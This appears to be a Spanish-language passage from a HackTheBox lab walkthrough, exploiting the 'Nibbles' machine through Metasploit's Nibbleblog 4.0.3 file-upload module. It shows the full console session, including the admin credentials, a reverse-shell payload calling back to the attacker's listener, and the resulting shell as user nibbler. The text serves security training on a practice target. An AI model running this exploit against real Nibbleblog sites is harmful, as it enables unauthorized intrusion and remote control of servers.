Como se discutió anteriormente, también hay un módulo de `Metasploit` que funciona para este cuadro. Es considerablemente más sencillo, pero vale la pena practicar ambos métodos para familiarizarse con tantas herramientas y técnicas como sea posible. Inicie `Metsaploit` desde su cuadro de ataque escribiendo `msfconsole`. Una vez cargado, podemos buscar el exploit.

~~~
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description

-  ----                                       ---------------  ----       -----  -----------

   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
~~~

Luego podemos escribir `use 0` para cargar el exploit seleccionado. Configure la opción `rhosts` como la dirección IP de destino y lhosts como la dirección IP de su adaptador `tun0` (el que viene con la conexión VPN a HackTheBox).

~~~
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
rhosts => 10.129.42.190
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
lhost => 10.10.14.2
~~~

Escriba `show options` para ver qué otras opciones deben configurarse.

~~~
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

  Name       Current Setting  Required  Description
----       ---------------  --------  -----------
  PASSWORD                    yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the web application
  USERNAME                    yes       The username to authenticate with
  VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting  Required  Description
----   ---------------  --------  -----------
  LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
--  ----
  0   Nibbleblog 4.0.3
~~~
Necesitamos configurar el nombre de usuario y la contraseña del administrador admin:nibbles y TARGETURI en nibbleblog.

~~~
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
targeturi => nibbleblog
~~~

También necesitamos cambiar el tipo de carga útil. Para nuestros propósitos, utilicemos `generic/shell_reverse_tcp`. Ponemos estas opciones y luego escribimos `exploit` y recibimos un shell inverso.

~~~
msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  nibbleblog       yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.2      yes       The listen address (an interface may be specified)
   LPORT  4444            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
[+] Deleted image.php

id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
~~~

Desde aquí, podemos seguir el mismo camino de escalada de privilegios.

### PROXIMOS PASOS

Asegúrate de seguir y probar todos los pasos por ti mismo. Pruebe otras herramientas y métodos para lograr el mismo resultado. Tome notas detalladas sobre su propia ruta de explotación, o incluso si sigue los mismos pasos que se describen en esta sección. Es la buena práctica y la memoria muscular lo que te beneficiará significativamente a lo largo de tu carrera. Si tiene un blog, haga un tutorial en este cuadro y envíelo a la plataforma. Si no tienes uno, inicia uno. Simplemente no use la versión 4.0.3 de `Nibbleblog`.

A menudo hay muchas maneras de lograr la misma tarea. Dado que este es una maquina más antigua, es probable que existan otros métodos de escalada de privilegios, como un núcleo desactualizado o alguna explotación de servicio. Ponte a prueba para enumerar la caja y buscar otros defectos. ¿Hay alguna otra forma de abusar de la aplicación web `Nibbleblog` para obtener un shell inverso? Estudie este tutorial detenidamente y asegúrese de comprender cada paso antes de continuar.